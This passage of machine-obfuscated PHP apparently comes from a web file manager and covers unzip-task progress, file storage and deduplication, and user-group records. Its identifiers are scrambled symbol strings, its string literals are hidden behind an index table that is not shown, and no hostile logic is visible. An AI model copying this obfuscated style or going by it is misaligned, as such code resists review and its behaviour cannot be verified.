Cache::remove($¨Ä»ËÆ); } Cache::set($¨Ä»ËÆ, $›ªĞô½, 60); Cache::removeMemory($¨Ä»ËÆ); } public static function finished($±öÆÛ°¢, $Ş–Á‘ÛÚ) { $ÚŸ÷»é =& $_SERVER[­õöî’–]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ÚŸ÷»é[264] => $±öÆÛ°¢, $ÚŸ÷»é[1758] => $Ş–Á‘ÛÚ); } private static function finishedRun() { $ã¸¯éƒÜ =& $_SERVER[­õöî’–]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $ş«±ÈÃ) { try { Hook::apply($ş«±ÈÃ[$ã¸¯éƒÜ[264]], $ş«±ÈÃ[$ã¸¯éƒÜ[1758]]); } catch (Exception $ùáë»Ôı) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $í¦ó¸¡ =& $_SERVER[­õöî’–]; parent::startAfter(); Hook::bind($í¦ó¸¡[1770], array($this, $í¦ó¸¡[1771])); Hook::bind($í¦ó¸¡[1192], array($this, $í¦ó¸¡[1772])); $ëÄõßœÒ =& $this->task; $ëÄõßœÒ[$í¦ó¸¡[1773]] = $í¦ó¸¡[1193]; if (!$ëÄõßœÒ[$í¦ó¸¡[1560]]) { $ëÄõßœÒ[$í¦ó¸¡[1560]] = LNG($í¦ó¸¡[1774]); } } protected function endAfter() { $ÂÄµÛ»— =& $_SERVER[­õöî’–]; parent::endAfter(); Hook::unbind($ÂÄµÛ»—[1770], array($this, $ÂÄµÛ»—[1771])); Hook::unbind($ÂÄµÛ»—[1192], array($this, $ÂÄµÛ»—[1772])); } public function updateAfter() { $­Æ§¨ =& $_SERVER[­õöî’–]; $ÓåÔËå =& $this->task; if (!$ÓåÔËå[$­Æ§¨[777]] || !$ÓåÔËå[$­Æ§¨[754]]) { return; } if ($ÓåÔËå[$­Æ§¨[1773]] == $­Æ§¨[1193]) { $ÛÑ­ = 0; if ($ÓåÔËå[$­Æ§¨[1713]]) { $ÛÑ­ = $ÓåÔËå[$­Æ§¨[1714]] / $ÓåÔËå[$­Æ§¨[1713]]; } $ÓåÔËå[$­Æ§¨[1662]] = $ÛÑ­ * 0.3; } else { if ($ÓåÔËå[$­Æ§¨[1773]] == $­Æ§¨[313]) { $ÛÑ­ = $ÓåÔËå[$­Æ§¨[1661]] / $ÓåÔËå[$­Æ§¨[777]]; $ÓåÔËå[$­Æ§¨[1662]] = 0.3 + $ÛÑ­ * 0.4; } else { if ($ÓåÔËå[$­Æ§¨[1773]] == $­Æ§¨[107]) { $ƒ¤¼ë›Ä = 0; if ($ÓåÔËå[$­Æ§¨[1715]] == $­Æ§¨[107]) { $ƒ¤¼ë›Ä = $ÓåÔËå[$­Æ§¨[1714]]; } $ÛÑ­ = ($ÓåÔËå[$­Æ§¨[1718]] + $ƒ¤¼ë›Ä) / $ÓåÔËå[$­Æ§¨[754]]; $ÓåÔËå[$­Æ§¨[1662]] = 0.3 + 0.4 + $ÛÑ­ * 0.3; } } } if ($ÓåÔËå[$­Æ§¨[1662]] > 0) { $±ã¼ï¶ƒ = timeFloat() - $ÓåÔËå[$­Æ§¨[1664]] - $ÓåÔËå[$­Æ§¨[1667]]; $ÓåÔËå[$­Æ§¨[1668]] = $±ã¼ï¶ƒ * (1 - $ÓåÔËå[$­Æ§¨[1662]]) / $ÓåÔËå[$­Æ§¨[1662]]; } } public function addFile($íÜ€¯ø‡) { $‰ùµ›ÃÆ =& $_SERVER[­õöî’–]; $Ó¨Øğ™¨ =& $this->task; $á†Ë®Ì = IO::info($íÜ€¯ø‡); $Ó¨Øğ™¨[$‰ùµ›ÃÆ[1711]] = $á†Ë®Ì[$‰ùµ›ÃÆ[32]]; $Ó¨Øğ™¨[$‰ùµ›ÃÆ[1713]] = $á†Ë®Ì[$‰ùµ›ÃÆ[76]]; $Ó¨Øğ™¨[$‰ùµ›ÃÆ[1714]] = 0; $Ó¨Øğ™¨[$‰ùµ›ÃÆ[1062]] = $‰ùµ›ÃÆ[1734]; $Ó¨Øğ™¨[$‰ùµ›ÃÆ[1715]] = $‰ùµ›ÃÆ[1193]; $Ó¨Øğ™¨[$‰ùµ›ÃÆ[754]] = $á†Ë®Ì[$‰ùµ›ÃÆ[76]]; $Ó¨Øğ™¨[$‰ùµ›ÃÆ[777]] = 1; $Œ„°ÂÇ = 0; $Ó¨Øğ™¨[$‰ùµ›ÃÆ[1722]] = array($‰ùµ›ÃÆ[1723] => $Œ„°ÂÇ + 1, $‰ùµ›ÃÆ[420] => $á†Ë®Ì[$‰ùµ›ÃÆ[32]], $‰ùµ›ÃÆ[84] => $á†Ë®Ì[$‰ùµ›ÃÆ[84]], $‰ùµ›ÃÆ[519] => $á†Ë®Ì[$‰ùµ›ÃÆ[519]] ? $á†Ë®Ì[$‰ùµ›ÃÆ[519]] : $á†Ë®Ì[$‰ùµ›ÃÆ[84]]); $this->update(); } public function unzipAfter($ååÌ™àé) { $õÏÎ©Ò„ =& $_SERVER[­õöî’–]; $¤ü¦øË¹ =& $this->task; $¤ü¦øË¹[$õÏÎ©Ò„[1773]] = $õÏÎ©Ò„[107]; $¨®Ãáö˜ = IO::infoWithChildren($ååÌ™àé); $ë‡ÛÀ–¼ = 0; $¤ü¦øË¹[$õÏÎ©Ò„[1722]] = array($õÏÎ©Ò„[1723] => $ë‡ÛÀ–¼ + 1, $õÏÎ©Ò„[420] => $¨®Ãáö˜[$õÏÎ©Ò„[32]], $õÏÎ©Ò„[84] => $¨®Ãáö˜[$õÏÎ©Ò„[84]], $õÏÎ©Ò„[519] => $¨®Ãáö˜[$õÏÎ©Ò„[519]] ? $¨®Ãáö˜[$õÏÎ©Ò„[519]] : $¨®Ãáö˜[$õÏÎ©Ò„[84]]); if ($¨®Ãáö˜[$õÏÎ©Ò„[33]] == $õÏÎ©Ò„[199]) { $¤ü¦øË¹[$õÏÎ©Ò„[777]] = 1; } else { $¤ü¦øË¹[$õÏÎ©Ò„[777]] = $¨®Ãáö˜[$õÏÎ©Ò„[79]][$õÏÎ©Ò„[77]]; } $¤ü¦øË¹[$õÏÎ©Ò„[1062]] = $õÏÎ©Ò„[12]; $¤ü¦øË¹[$õÏÎ©Ò„[1715]] = 0; $¤ü¦øË¹[$õÏÎ©Ò„[1661]] = 0; $¤ü¦øË¹[$õÏÎ©Ò„[1713]] = 0; $¤ü¦øË¹[$õÏÎ©Ò„[1714]] = 0; $¤ü¦øË¹[$õÏÎ©Ò„[1711]] = $õÏÎ©Ò„[12]; $¤ü¦øË¹[$õÏÎ©Ò„[1718]] = 0; $¤ü¦øË¹[$õÏÎ©Ò„[754]] = $¨®Ãáö˜[$õÏÎ©Ò„[76]]; $this->update(); self::log($õÏÎ©Ò„[1775] . json_encode(array($¤ü¦øË¹, $¨®Ãáö˜))); } public function nameParse($àÂ›ã) { $«ÔÅ›êà =& $_SERVER[­õöî’–]; $›¢¸èÆ =& $this->task; if ($›¢¸èÆ[$«ÔÅ›êà[1773]] == $«ÔÅ›êà[1193]) { $›¢¸èÆ[$«ÔÅ›êà[1773]] = $«ÔÅ›êà[313]; $›¢¸èÆ[$«ÔÅ›êà[1718]] = 0; $›¢¸èÆ[$«ÔÅ›êà[754]] = 0; } $Áâ½Öş = get_path_this($àÂ›ã); if (strstr($Áâ½Öş, $«ÔÅ›êà[10])) { $›¢¸èÆ[$«ÔÅ›êà[1661]] += 1; $›¢¸èÆ[$«ÔÅ›êà[777]] += 1; } $›¢¸èÆ[$«ÔÅ›êà[1711]] = $àÂ›ã; $this->update(); } } goto eŸØÁ¿¡Ã¬; c…ÊÎ¿ˆÉŒ: define($_SERVER[­õöî’–][238], 1); define($_SERVER[­õöî’–][239], 2); define($_SERVER[­õöî’–][240], 3); goto B‡ÈÆ¹ó¨; C…ºŞ’ó°ƒ: class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\154\145"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\x6d\145" => "\x69\157\137\146\x69\x6c\145\x5f\155\x65\164\141", "\155\x65\x74\141\106\151\145\x6c\x64" => "\x66\151\x6c\145\111\x44"); public function fileInfo($«îÏÂ¤æ) { $³¹ÁŞ÷ =& $_SERVER[­õöî’–]; static $Ò¶ËÎ„· = array(); if (!isset($Ò¶ËÎ„·[$«îÏÂ¤æ])) { $óüÍ…×› = $³¹ÁŞ÷[1898]; $„×ß¦¯Æ = Model($³¹ÁŞ÷[471])->field($óüÍ…×›)->where(array($³¹ÁŞ÷[469] => $«îÏÂ¤æ))->find(); $Ò¶ËÎ„·[$«îÏÂ¤æ] = $„×ß¦¯Æ; } return $Ò¶ËÎ„·[$«îÏÂ¤æ]; } public function addFileByContent($Ãö›ÊÊÓ = '', $„ÆÎĞˆÊ = '') { $äğ†«…É =& $_SERVER[­õöî’–]; $ıòó¼ÕÙ = TEMP_PATH . $äğ†«…É[1899]; if (!is_dir($ıòó¼ÕÙ)) { mk_dir($ıòó¼ÕÙ); } $¡˜ÎÔä = $ıòó¼ÕÙ . $äğ†«…É[1900] . rand_string(16); file_put_contents($¡˜ÎÔä, $Ãö›ÊÊÓ); $–€šŠùš = $this->addFile($¡˜ÎÔä, $„ÆÎĞˆÊ, !0); if (file_exists($¡˜ÎÔä)) { @unlink($¡˜ÎÔä); } return $–€šŠùš; } public function createFileName($éî’³ôÆ, $ÁÁğÚ’ = false, $Ø¥Ò’•ù = false) { $½ğ‘üš =& $_SERVER[­õöî’–]; $úòÉç ä = IO::init($½ğ‘üš[8]); $™ìÖğŞÎ = $this->makeFilePath($éî’³ôÆ, $úòÉç ä, $ÁÁğÚ’, $Ø¥Ò’•ù); $¦«ÏŒ‚÷ = $úòÉç ä->pathFather($™ìÖğŞÎ); static $ÓùëáĞ‘ = false; $¸ºìÑí§ = $½ğ‘üš[1901] . md5($¦«ÏŒ‚÷); if (!$ÓùëáĞ‘ && !Cache::get($¸ºìÑí§)) { $ÓùëáĞ‘ = !0; $û¸®Ä•ß = IO::mkdir($¦«ÏŒ‚÷); if (!IO::exist($û¸®Ä•ß . $½ğ‘üš[788])) { IO::mkfile($û¸®Ä•ß . $½ğ‘üš[788]); } Cache::set($¸ºìÑí§, 1, 3600 * 2); } return $™ìÖğŞÎ; } public function makeFilePath($–¡¹´ù¸, $¥ø¸¤ˆÖ, $Å»ø´½Ô = false, $İŒ‘°‰ = false) { $—¿îËµ =& $_SERVER[­õöî’–]; $ÑÒƒ¬ó› = Model($—¿îËµ[761])->get($—¿îËµ[1902]); $î¨µ•ˆ = KodIO::defaultIO() . date($—¿îËµ[1903]); $×–º¯Õ = $î¨µ•ˆ . rand_string(5) . short_id(100); $–¡¹´ù¸ = str_replace($—¿îËµ[8], $—¿îËµ[11], KodIO::clear($–¡¹´ù¸)); $µÑ»áâ = $¥ø¸¤ˆÖ->ext($–¡¹´ù¸); if (!$–¡¹´ù¸) { $ÑÒƒ¬ó› = $—¿îËµ[1904]; } switch ($ÑÒƒ¬ó›) { case $—¿îËµ[1905]: $×–º¯Õ = $×–º¯Õ . $—¿îËµ[10] . $¥ø¸¤ˆÖ->ext($–¡¹´ù¸); if ($µÑ»áâ == $—¿îËµ[1842]) { $×–º¯Õ .= $—¿îËµ[1205]; } break; case $—¿îËµ[1906]: $”ø‰¥¿› = Model($—¿îËµ[761])->get($—¿îËµ[762]); $„êã•ˆø = substr(md5($—¿îËµ[763] . $”ø‰¥¿› . date($—¿îËµ[739])), 0, 8); $ç“ö¡æª = KodIO::defaultDriver(); $î¨µ•ˆ = $—¿îËµ[1236] . $ç“ö¡æª[$—¿îËµ[399]] . $—¿îËµ[409] . date($—¿îËµ[1907]) . $„êã•ˆø . $—¿îËµ[8]; if ($µÑ»áâ == $—¿îËµ[1842]) { $–¡¹´ù¸ .= $—¿îËµ[1205]; } $–„ÅúÉÄ = $—¿îËµ[1908] . $î¨µ•ˆ . $–¡¹´ù¸; CacheLock::lock($–„ÅúÉÄ); $×–º¯Õ = $î¨µ•ˆ . $–¡¹´ù¸; if (IO::exist($î¨µ•ˆ . $–¡¹´ù¸)) { $®êó›× = substr($–¡¹´ù¸, 0, strlen($–¡¹´ù¸) - strlen($µÑ»áâ)); $åáÏ¹Š´ = $İŒ‘°‰ ? substr($İŒ‘°‰, 0, 5) : ($Å»ø´½Ô ? substr($Å»ø´½Ô, 0, 5) : rand_string(5)); $×–º¯Õ = $î¨µ•ˆ . $®êó›× . $åáÏ¹Š´ . $—¿îËµ[10] . $µÑ»áâ; } if (IO::isTypeObject($×–º¯Õ) && !IO::isUploadServer($×–º¯Õ)) { if (IO::exist($×–º¯Õ)) { return $×–º¯Õ; } $£Ó«¹ = IO::setContent($×–º¯Õ, $—¿îËµ[12]); if (!$£Ó«¹) { show_json($—¿îËµ[1909], !1); } } CacheLock::unlock($–„ÅúÉÄ); break; case $—¿îËµ[1904]: break; default: break; } return $×–º¯Õ; } public function addFileByRemote($±½»Ÿó, $Úë¼İ•, $¦´²ï£ = array()) { $©ò«ÜÕ´ =& $_SERVER[­õöî’–]; if (!IO::exist($±½»Ÿó)) { return !1; } $¨Ü»ò•Š = $¦´²ï£[$©ò«ÜÕ´[176]] ? $¦´²ï£[$©ò«ÜÕ´[176]] : $©ò«ÜÕ´[12]; $³¼È¦şï = IO::hashMd5($±½»Ÿó, $¨Ü»ò•Š); $ùÈÒüƒè = KodIO::defaultDriver(); $Šë’‡… = array($©ò«ÜÕ´[585] => IO::size($±½»Ÿó), $©ò«ÜÕ´[1910] => 1, $©ò«ÜÕ´[420] => $Úë¼İ•, $©ò«ÜÕ´[799] => $ùÈÒüƒè[$©ò«ÜÕ´[399]], $©ò«ÜÕ´[421] => $±½»Ÿó, $©ò«ÜÕ´[1911] => $¦´²ï£[$©ò«ÜÕ´[177]] ? $¦´²ï£[$©ò«ÜÕ´[177]] : IO::hashSimple($±½»Ÿó), $©ò«ÜÕ´[1912] => $³¼È¦şï ? $³¼È¦şï : $¨Ü»ò•Š); if ($˜±ì¹•’ = $this->addFileCheckExist($Šë’‡…[$©ò«ÜÕ´[177]], $Šë’‡…[$©ò«ÜÕ´[176]], $Šë’‡…[$©ò«ÜÕ´[76]])) { return $˜±ì¹•’; } return $this->addFileData($Šë’‡…); } private function addFileData($ì²•Õ€É) { $–Ø”úò¶ =& $_SERVER[­õöî’–]; if (!$ì²•Õ€É) { return !1; } $ì²•Õ€É[$–Ø”úò¶[76]] = intval($ì²•Õ€É[$–Ø”úò¶[76]]); if (!$ì²•Õ€É[$–Ø”úò¶[76]] && strlen($ì²•Õ€É[$–Ø”úò¶[177]]) > 32) { $ì²•Õ€É[$–Ø”úò¶[76]] = intval(substr($ì²•Õ€É[$–Ø”úò¶[177]], 32)); } $®ÀÖ£Óé = $this->add($ì²•Õ€É); return $this->find($®ÀÖ£Óé); } public function addFile($Ü±ìàù, $©¸Âíœº, $—øŸÉò = false) { $ÖäªÂŠ =& $_SERVER[­õöî’–]; $Íü±¬±é = IO::hashSimple($Ü±ìàù); $ƒ¦ã¾œ = IO::size($Ü±ìàù); $ˆ­âĞ¥© = $ƒ¦ã¾œ <= 1024 * 1024 * 10 ? IO::hashMd5($Ü±ìàù) : $ÖäªÂŠ[12]; $ßÚÈÓœ¥ = $ÖäªÂŠ[1913] . $Íü±¬±é; CacheLock::lock($ßÚÈÓœ¥); if ($ˆ­âĞ¥© && $Íü±¬±é) { $‹È¨„Ê = $this->addFileCheckExist($Íü±¬±é, $ˆ­âĞ¥©, $ƒ¦ã¾œ); if ($‹È¨„Ê) { CacheLock::unlock($ßÚÈÓœ¥); return $‹È¨„Ê; } } $·ËÎÌÒé = $this->addFileMake($Ü±ìàù, $ƒ¦ã¾œ, $Íü±¬±é, $ˆ­âĞ¥©, $©¸Âíœº, $—øŸÉò); $•×ø´¹ì = $this->addFileData($·ËÎÌÒé); CacheLock::unlock($ßÚÈÓœ¥); if (!$ˆ­âĞ¥© && $•×ø´¹ì) { $this->fileMd5Check($•×ø´¹ì); } return $•×ø´¹ì; } private function fileMd5Check($•“Œ²‚—) { $æè¹«€ =& $_SERVER[­õöî’–]; $”äØ§ü = array($•“Œ²‚—[$æè¹«€[468]], $•“Œ²‚—[$æè¹«€[84]]); $æØü¬·æ = $æè¹«€[1914] . $•“Œ²‚—[$æè¹«€[84]]; $î©½ßµ = $æè¹«€[1915] . $•“Œ²‚—[$æè¹«€[468]]; $«ı…Šï = TaskQueue::add($æè¹«€[1916], $”äØ§ü, $æØü¬·æ, $î©½ßµ); if (!$«ı…Šï) { $this->fileMd5Set($•“Œ²‚—[$æè¹«€[468]], $•“Œ²‚—[$æè¹«€[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($ó©µª©Î, $·ÆòˆÎ) { $ş©ñèö‹ =& $_SERVER[­õöî’–]; $ôôò‚Ñ = $this->find($ó©µª©Î); if (!$ôôò‚Ñ || $ôôò‚Ñ[$ş©ñèö‹[176]]) { return; } $£Êñšœ = IO::hashMd5($·ÆòˆÎ); if (!$£Êñšœ) { return $ş©ñèö‹[12]; } $this->where(array($ş©ñèö‹[468] => $ó©µª©Î))->save(array($ş©ñèö‹[176] => $£Êñšœ)); } public function addFileMake($Ñ‘´èÔ¬, $šÛ÷á, $ú®¼ˆ¨, $Æğİ“’Ş, $Ï¥Ûå“«, $Ìú·•¦) { $…£ß°Ô =& $_SERVER[­õöî’–]; $½ĞÀ®ïÛ = $this->createFileName($Ï¥Ûå“«, $ú®¼ˆ¨, $Æğİ“’Ş); $„¨ÛÖ¨Ú = get_path_father($½ĞÀ®ïÛ); $æıÅ°­˜ = get_path_this($½ĞÀ®ïÛ); if ($Ìú·•¦) { $¯Ã¥òÚ× = IO::move($Ñ‘´èÔ¬, $„¨ÛÖ¨Ú, !1, $æıÅ°­˜); } else { $¯Ã¥òÚ× = IO::copy($Ñ‘´èÔ¬, $„¨ÛÖ¨Ú, !1, $æıÅ°­˜); } if (!$¯Ã¥òÚ×) { return !1; } $¿¬İ©‘Ò = KodIO::defaultDriver(); $ÍÛ˜‡é = array($…£ß°Ô[585] => $šÛ÷á, $…£ß°Ô[1910] => 1, $…£ß°Ô[420] => $Ï¥Ûå“«, $…£ß°Ô[799] => $¿¬İ©‘Ò[$…£ß°Ô[399]], $…£ß°Ô[421] => $½ĞÀ®ïÛ, $…£ß°Ô[1911] => $ú®¼ˆ¨, $…£ß°Ô[1912] => $Æğİ“’Ş); return $ÍÛ˜‡é; } public function addFileCheckExist($¯áÆï¡Ã, $ğŞı¢ÜË, $µ…«Ãä) { $¾ã£…Ü  =& $_SERVER[­õöî’–]; $‹À‹«ˆŒ = $this->findByHash($¯áÆï¡Ã, $ğŞı¢ÜË); if (!$‹À‹«ˆŒ) { return !1; } $ ù”‹ = array($¾ã£…Ü [1910] => intval($‹À‹«ˆŒ[$¾ã£…Ü [1917]]) + 1, $¾ã£…Ü [585] => $µ…«Ãä); $this->where(array($¾ã£…Ü [469] => $‹À‹«ˆŒ[$¾ã£…Ü [468]]))->save($ ù”‹); return $‹À‹«ˆŒ; } public function remove($µ²†èõ) { $this->linkCountChange($µ²†èõ, !1); $this->clearEmpty(); return !0; } public function linkAdd($èÑ±ğ¨Í) { $this->linkCountChange($èÑ±ğ¨Í, !0); } public function linkCountChange($Ğ’îÕË, $Ë¢ˆø¸æ) { $ÃäûëØı =& $_SERVER[­õöî’–]; if (!$Ğ’îÕË) { return; } if (!is_array($Ğ’îÕË)) { $Ğ’îÕË = array($Ğ’îÕË); } $ÂÛ„ ÏÜ = array(); foreach ($Ğ’îÕË as $ÚêÎ²¥â) { $¶Ğ˜åóà = $ÚêÎ²¥â . $ÃäûëØı[12]; if (!$ÂÛ„ ÏÜ[$¶Ğ˜åóà]) { $ÂÛ„ ÏÜ[$¶Ğ˜åóà] = 0; } $ÂÛ„ ÏÜ[$¶Ğ˜åóà]++; } $¹©ç´­µ = array(); foreach ($ÂÛ„ ÏÜ as $ÚêÎ²¥â => $øØé“°¥) { $¶Ğ˜åóà = $øØé“°¥ . $ÃäûëØı[12]; if (!$¹©ç´­µ[$¶Ğ˜åóà]) { $¹©ç´­µ[$¶Ğ˜åóà] = array(); } $¹©ç´­µ[$¶Ğ˜åóà][] = $ÚêÎ²¥â; } foreach ($¹©ç´­µ as $øØé“°¥ => $¨“‰ü) { if (!$¨“‰ü) { continue; } $øØé“°¥ = $Ë¢ˆø¸æ ? $øØé“°¥ : -intval($øØé“°¥); $õ°ê’Ë¹ = array($ÃäûëØı[468] => array($ÃäûëØı[7], $¨“‰ü)); if ($øØé“°¥ < 0) { $õ°ê’Ë¹[$ÃäûëØı[1917]] = array($ÃäûëØı[1013], abs($øØé“°¥)); } $this->where($õ°ê’Ë¹)->setAdd($ÃäûëØı[1917], $øØé“°¥); } } public function findByHash($ßÁûò÷œ, $§Ï©‚ôË = false) { $‚» şø =& $_SERVER[­õöî’–]; if (!$ßÁûò÷œ && !$§Ï©‚ôË) { return !1; } $êÔã£¸â = array($‚» şø[1911] => $ßÁûò÷œ); if ($§Ï©‚ôË) { $êÔã£¸â = array($‚» şø[1912] => $§Ï©‚ôË); } return $this->order($‚» şø[1918])->where($êÔã£¸â)->find(); } public function clearEmpty($¢…Úï®Ã = 0) { $©â®­¸  =& $_SERVER[­õöî’–]; $çÔ‘¡ã« = time() - 3600 * 24 * $¢…Úï®Ã; $ïÎ£Ì¿ş = $©â®­¸ [1919] . $çÔ‘¡ã«; $»–Ûš§ = $this->where($ïÎ£Ì¿ş)->select(); if (!$»–Ûš§) { return; } $µ„²º©ş = new Task($©â®­¸ [1920], $©â®­¸ [12], count($»–Ûš§)); foreach ($»–Ûš§ as $›ß›š¤ö) { $µ„²º©ş->update(1); $this->resetFile($›ß›š¤ö); } $µ„²º©ş->end(); } public function resetFile($ŒŠõÚÊ®) { $“÷ˆúŠç =& $_SERVER[­õöî’–]; $÷¹—İéà = array($“÷ˆúŠç[469] => $ŒŠõÚÊ®[$“÷ˆúŠç[468]]); $ìí¬óë = Model($“÷ˆúŠç[1334])->where($÷¹—İéà)->count(); $ÂŠ‹õ­’ = Model($“÷ˆúŠç[1921])->where($÷¹—İéà)->count(); $ùüı¤¿æ = intval($ìí¬óë) + intval($ÂŠ‹õ­’); if ($ùüı¤¿æ == 0) { IO::remove($ŒŠõÚÊ®[$“÷ˆúŠç[84]]); Model($“÷ˆúŠç[1922])->delete($ŒŠõÚÊ®[$“÷ˆúŠç[468]]); $this->where($÷¹—İéà)->delete(); $this->metaSet($ŒŠõÚÊ®[$“÷ˆúŠç[468]], null, null); return; } if ($ŒŠõÚÊ®[$“÷ˆúŠç[1917]] != $ùüı¤¿æ) { $this->where($÷¹—İéà)->save(array($“÷ˆúŠç[1910] => $ùüı¤¿æ)); } } public function storageInfo($ÇöãÈ«± = false) { $£†”ö…© =& $_SERVER[­õöî’–]; $ˆºóï²Å = $this->count() + 0.0; $äåğè’œ = 0; $ÆèÏ³Ä’ = 1; $Ëİš¨Ïé = 0; $¡Ú½º¶Ø = 5000; for ($Àüâéáè = 0; $Àüâéáè < $ˆºóï²Å; $Àüâéáè = $Àüâéáè + $¡Ú½º¶Ø) { $æªÜ¬´ = $this->limit($Àüâéáè, $Àüâéáè + $¡Ú½º¶Ø)->select(); foreach ($æªÜ¬´ as $íğñ…§) { $ÆèÏ³Ä’ += $íğñ…§[$£†”ö…©[76]] * $íğñ…§[$£†”ö…©[1917]]; $äåğè’œ += $íğñ…§[$£†”ö…©[76]] * ($íğñ…§[$£†”ö…©[1917]] - 1); $Ëİš¨Ïé += $íğñ…§[$£†”ö…©[1917]]; } } $¿€å¹º× = array($£†”ö…©[1923] => $ÆèÏ³Ä’, $£†”ö…©[1924] => $äåğè’œ, $£†”ö…©[1925] => $äåğè’œ / $ÆèÏ³Ä’, $£†”ö…©[80] => $ˆºóï²Å, $£†”ö…©[1926] => $Ëİš¨Ïé); return $¿€å¹º×; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\164\141\x62\154\145\x4e\141\155\145" => "\147\x72\x6f\165\160\x5f\155\x65\164\x61", "\155\145\x74\x61\106\151\x65\x6c\144" => "\147\162\x6f\165\x70\111\104"); protected function cacheFunctionAlias($…ô•²Âò) { $¸øÄ‡û‰ =& $_SERVER[­õöî’–]; return array($¸øÄ‡û‰[1927] => array($…ô•²Âò[0], $¸øÄ‡û‰[1928]), $¸øÄ‡û‰[1929] => array($…ô•²Âò[0], $¸øÄ‡û‰[1930])); } protected function getInfo($»´ÚÅ§ğ, $‡¿ˆŸ— = false) { $ÜıÑˆ³± = $this->getInfoSimple($»´ÚÅ§ğ); if (!$ÜıÑˆ³±) { return !1; } if ($‡¿ˆŸ—) { return $this->_listDataApplyItem($ÜıÑˆ³±); } return $this->cacheFunctionGet($_SERVER[­õöî’–][1931], $»´ÚÅ§ğ); } protected function getInfoSimple($ªä–°¨¼, $ÀîÜÁ ¾ = false) { $¢´ÕÃ£ =& $_SERVER[­õöî’–]; if ($ÀîÜÁ ¾) { $¼âÀÕ± = array($¢´ÕÃ£[1849] => intval($ªä–°¨¼)); $š˜ ê» = $this->where($¼âÀÕ±)->find(); return is_array($š˜ ê») ? $š˜ ê» : array(); } return $this->cacheFunctionGet($¢´ÕÃ£[1932], $ªä–°¨¼); } protected function groupAdd($İØÅµáš) { $ü‰ù¼ÎË =& $_SERVER[­õöî’–]; if (!$İØÅµáš[$ü‰ù¼ÎË[432]] && isset($İØÅµáš[$ü‰ù¼ÎË[1849]]) && $İØÅµáš[$ü‰ù¼ÎË[1849]] == 1) { if ($Ë˜ï÷¸½ = $this->getInfoSimple($İØÅµáš[$ü‰ù¼ÎË[1849]], !0)) { return $İØÅµáš[$ü‰ù¼ÎË[1849]]; } } else { $Ë˜ï÷¸½ = $this->getInfoSimple($İØÅµáš[$ü‰ù¼ÎË[432]]); if (!$Ë˜ï÷¸½) { return !1; } } $ÑÇš²ƒì = $ü‰ù¼ÎË[531]; if ($Ë˜ï÷¸½[$ü‰ù¼ÎË[521]]) { $ÑÇš²ƒì = $Ë˜ï÷¸½[$ü‰ù¼ÎË[521]] . $Ë˜ï÷¸½[$ü‰ù¼ÎË[1849]] . $ü‰ù¼ÎË[50]; } $ä•Èó‡ = array($ü‰ù¼ÎË[420] => $this->groupNameAuto($İØÅµáš[$ü‰ù¼ÎË[432]], $İØÅµáš[$ü‰ù¼ÎË[32]]), $ü‰ù¼ÎË[401] => $İØÅµáš[$ü‰ù¼ÎË[432]], $ü‰ù¼ÎË[590] => $ÑÇš²ƒì, $ü‰ù¼ÎË[1933] => $İØÅµáš[$ü‰ù¼ÎË[1836]], $ü‰ù¼ÎË[1934] => 0, $ü‰ù¼ÎË[1853] => 0); if (isset($İØÅµáš[$ü‰ù¼ÎË[1873]])) { $ä•Èó‡[$ü‰ù¼ÎË[1873]] = $İØÅµáš[$ü‰ù¼ÎË[1873]]; } else { $¨•Şü¸Ê = $this->max($ü‰ù¼ÎË[1873]); if (!$¨•Şü¸Ê) { $¨•Şü¸Ê = 0; } $ä•Èó‡[$ü‰ù¼ÎË[1873]] = $¨•Şü¸Ê + 1; } if (!empty($İØÅµáš[$ü‰ù¼ÎË[1849]])) { $ä•Èó‡[$ü‰ù¼ÎË[1849]] = $İØÅµáš[$ü‰ù¼ÎË[1849]]; } $‰«áãŒñ = $this->add($ä•Èó‡); $this->setNamePinyin($‰«áãŒñ, $ä•Èó‡[$ü‰ù¼ÎË[32]]); if (isset($İØÅµáš[$ü‰ù¼ÎË[1935]])) { $this->metaSet($‰«áãŒñ, array($ü‰ù¼ÎË[1935] => $İØÅµáš[$ü‰ù¼ÎË[1935]], $ü‰ù¼ÎË[1936] => $İØÅµáš[$ü‰ù¼ÎË[1936]])); unset($İØÅµáš[$ü‰ù¼ÎË[1935]]); unset($İØÅµáš[$ü‰ù¼ÎË[1936]]); } Model($ü‰ù¼ÎË[1334])->groupRootAdd($‰«áãŒñ); return $‰«áãŒñ; } protected function groupEdit($‚ò¿ğî•, $Ìœî×ä´) { $„•êû• =& $_SERVER[­õöî’–]; $ö‘ö”òì = $this->getInfoSimple($‚ò¿ğî•); if (!$ö‘ö”òì) { return !1; } if (!empty($Ìœî×ä´[$„•êû•[432]])) { $¯åˆêà = $this->getInfoSimple($Ìœî×ä´[$„•êû•[432]]); if (!$¯åˆêà) { return !1; } if ($ö‘ö”òì[$„•êû•[1849]] == $¯åˆêà[$„•êû•[1849]]) { return !1; } if ($Ìœî×ä´[$„•êû•[432]] != $ö‘ö”òì[$„•êû•[432]]) { if ($¯åˆêà[$„•êû•[521]] !== $ö‘ö”òì[$„•êû•[521]] && strpos($¯åˆêà[$„•êû•[521]], $ö‘ö”òì[$„•êû•[521]] . $ö‘ö”òì[$„•êû•[1849]] . $„•êû•[50]) === 0) { return !1; } $Ìœî×ä´[$„•êû•[590]] = $¯åˆêà[$„•êû•[521]] . $Ìœî×ä´[$„•êû•[432]] . $„•êû•[50]; $this->_changeChildLevel($ö‘ö”òì, $¯åˆêà); } } if (isset($Ìœî×ä´[$„•êû•[32]])) { $this->setNamePinyin($‚ò¿ğî•, $Ìœî×ä´[$„•êû•[32]]); } if (isset($Ìœî×ä´[$„•êû•[1935]])) { $this->metaSet($‚ò¿ğî•, array($„•êû•[1935] => $Ìœî×ä´[$„•êû•[1935]], $„•êû•[1936] => $Ìœî×ä´[$„•êû•[1936]])); unset($Ìœî×ä´[$„•êû•[1935]]); unset($Ìœî×ä´[$„•êû•[1936]]); } $this->_clearChildrenCache($ö‘ö”òì); return $this->where(array($„•êû•[1937] => $‚ò¿ğî•))->save($Ìœî×ä´); } private function _clearChildrenCache($ö¼ÚÙ÷) { 